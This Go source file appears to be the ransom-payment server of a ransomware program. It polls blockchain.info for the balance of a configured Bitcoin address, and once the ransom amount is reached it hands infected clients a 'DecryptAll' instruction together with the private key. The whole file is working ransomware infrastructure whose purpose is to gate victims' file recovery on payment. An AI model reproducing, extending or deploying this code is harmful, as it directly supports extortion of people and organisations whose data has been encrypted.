package main

import (
	"flag"
	"github.com/jcelliott/lumber"
	"golang.org/x/net/html"
	"io"
	"io/ioutil"
	"net/http"
	"regexp"
	"strconv"
	"strings"
	"time"
)

var (
	balanceRR    = regexp.MustCompile(`\s*([\d\.])\sBTC.*`)
	serverConfig *ServerConfig
        isPaymentDone bool = false
)

func HttpGet(httpClient *http.Client, url string) (resp *http.Response, err error) {
	req, err := http.NewRequest("GET", url, nil)
	req.Header.Set("User-Agent", "curl/7.21.4 (universal-apple-darwin11.0) libcurl/7.21.4 OpenSSL/0.9.8x zlib/1.2.5")
	resp, err = httpClient.Do(req)
	return
}

func HttpGetBody(httpClient *http.Client, url string) (body string, err error) {
	resp, err := HttpGet(httpClient, url)
	defer resp.Body.Close()
	bodyb, err := ioutil.ReadAll(resp.Body)
	body = string(bodyb)
	return
}

func GetWalletInfo() (string, error) {
	clientPtr := &http.Client{}
	body, err := HttpGetBody(clientPtr, "https://blockchain.info/address/"+(*serverConfig).BtcAddress)
	if err != nil {
		return "", err
	}
	bodyStr := string(body)
	log.Trace("%s", bodyStr)
	return bodyStr, nil
}

func ExtractBalance() (string, error) {
	walletInfoHtml, err := GetWalletInfo()
	doc, err := html.Parse(strings.NewReader(walletInfoHtml))
	if err != nil {
		return "", err
	}

	var f func(*html.Node) string
	f = func(n *html.Node) string {
		if n.Type == html.ElementNode && n.Data == "td" {
			for _, attr := range n.Attr {
				if attr.Key == "id" && attr.Val == "final_balance" {
					if n.FirstChild != nil && n.FirstChild.FirstChild != nil {

						spanNode := n.FirstChild.FirstChild
						if spanNode.Data == "span" {
							if spanNode.FirstChild == nil {
								return ""
							}
							balance := spanNode.FirstChild.Data
							log.Debug("Final balance node %s", balance)
							balanceRR := regexp.MustCompile(`^\s*([\d\.]+)\sBTC.*`)
							matchRes := balanceRR.FindStringSubmatch(balance)
							if matchRes != nil {
								return matchRes[1]
							}
						}

					}

					return ""
				}
			}
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			res := f(c)
			if res != "" {
				return res
			}
		}
		return ""
	}

	res := f(doc)
	return res, nil

}

func ReadServerConfig() error {
	serverConfig = &ServerConfig{}
	return ReadFromJson(RSW_SC_FILE, serverConfig)

}


func HandleClientRequest(w http.ResponseWriter, req *http.Request) {

   if isPaymentDone {
        io.WriteString(w,"DecryptAll "+(*serverConfig).PrivateKey)
        log.Info("Sent back decrypt instruction to client ")
   } else{
        io.WriteString(w,"Payment not done or insufficient balance ")
   }

}

func StartServer(port int)  {
        http.HandleFunc("/", HandleClientRequest)
        serverListenAddr := "127.0.0.1:"+strconv.Itoa(port)
        log.Info("Starting server on %s ",serverListenAddr)
	err := http.ListenAndServe( serverListenAddr, nil)
	if err != nil {
		panic(err)
	}

}

func main() {

	var err error

	debug := flag.Bool("debug", false, "If debug mode is on")
	help := flag.Bool("help", false, "Display help")
	pollPeriod := flag.Int("poll", 600, "polling period to verify wallet amount")
	serverPort := flag.Int("port", 7001, "Set the server port")

	flag.Parse()

	if *help {
		usage()
	}

	if *debug {
		log = lumber.NewConsoleLogger(lumber.DEBUG)
	} else {
		log = lumber.NewConsoleLogger(lumber.INFO)
	}

	err = ReadServerConfig()
	if err != nil {
		panic(err)
	}
	queriedAmount, err := strconv.ParseFloat((*serverConfig).Amount, 32)
	if err != nil {
		log.Error("Invalid amount %s in server configuration", (*serverConfig).Amount)
		panic(err)
	}

        go StartServer(*serverPort)


        log.Info("Starting polling balance of %s ","https://blockchain.info/address/"+(*serverConfig).BtcAddress)

	ticker := time.NewTicker(time.Duration(*pollPeriod) * time.Second)
	var balanceNum float64 = 0

	for {
		select {
		case <-ticker.C:
			balance, err := ExtractBalance()
			if err != nil {
				log.Debug("%s", err)
			} else {
				log.Debug("balance %s", balance)
				if balance != "" {

					balanceNum, err = strconv.ParseFloat(balance, 32)
				}
				if err != nil {
					log.Debug("Invalid balance format", err)
				}
				if balanceNum >= queriedAmount {
					log.Debug("Payment has been done")
					isPaymentDone=true
				} else {
					log.Debug("balance is not enough")
				}
			}
		}

	}

}
